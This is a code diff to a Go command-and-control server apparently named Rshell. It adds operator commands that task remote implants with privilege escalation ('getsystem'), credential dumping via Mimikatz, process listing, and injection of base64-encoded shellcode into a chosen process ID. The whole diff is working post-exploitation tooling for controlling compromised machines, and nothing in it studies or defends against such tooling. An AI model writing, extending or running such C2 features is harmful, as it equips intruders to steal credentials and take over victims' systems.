@@ -10,6 +10,7 @@ import (
 	"Rshell/pkg/database"
 	"Rshell/pkg/encrypt"
 	"Rshell/pkg/utils"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"math"
@@ -142,6 +143,43 @@ func SendCommand(uid string, command string) {
 		shell.ShellContent = "$ clear"
 		database.Engine.Where("uid = ?", uid).Update(&shell)
 		return
+	} else if command == "getsystem" || strings.HasPrefix(command, "getsystem ") {
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.GETSYSTEM))
+		tech := strings.TrimPrefix(command, "getsystem ")
+		if tech != command {
+			byteToSend = append(cmdTypeBytes, []byte(tech)...)
+		} else {
+			byteToSend = cmdTypeBytes
+		}
+	} else if command == "mimikatz" {
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.MIMIKATZ))
+		byteToSend = cmdTypeBytes
+	} else if command == "list_processes" {
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.LIST_PROCESSES))
+		byteToSend = cmdTypeBytes
+	} else if strings.HasPrefix(command, "inject ") {
+		parts := strings.SplitN(strings.TrimPrefix(command, "inject "), " ", 2)
+		if len(parts) == 2 {
+			pid, err := strconv.Atoi(parts[0])
+			if err == nil {
+				shellcode, _ := base64.StdEncoding.DecodeString(parts[1])
+				cmdTypeBytes := make([]byte, 4)
+				binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PROCESS_INJECT))
+				pidBytes := make([]byte, 4)
+				binary.BigEndian.PutUint32(pidBytes, uint32(pid))
+				dataLenBytes := make([]byte, 4)
+				binary.BigEndian.PutUint32(dataLenBytes, uint32(len(shellcode)))
+				byteToSend = append(cmdTypeBytes, pidBytes...)
+				byteToSend = append(byteToSend, dataLenBytes...)
+				byteToSend = append(byteToSend, shellcode...)
+			}
+		}
+		if byteToSend == nil {
+			return
+		}
 	} else {
 		return
 	}
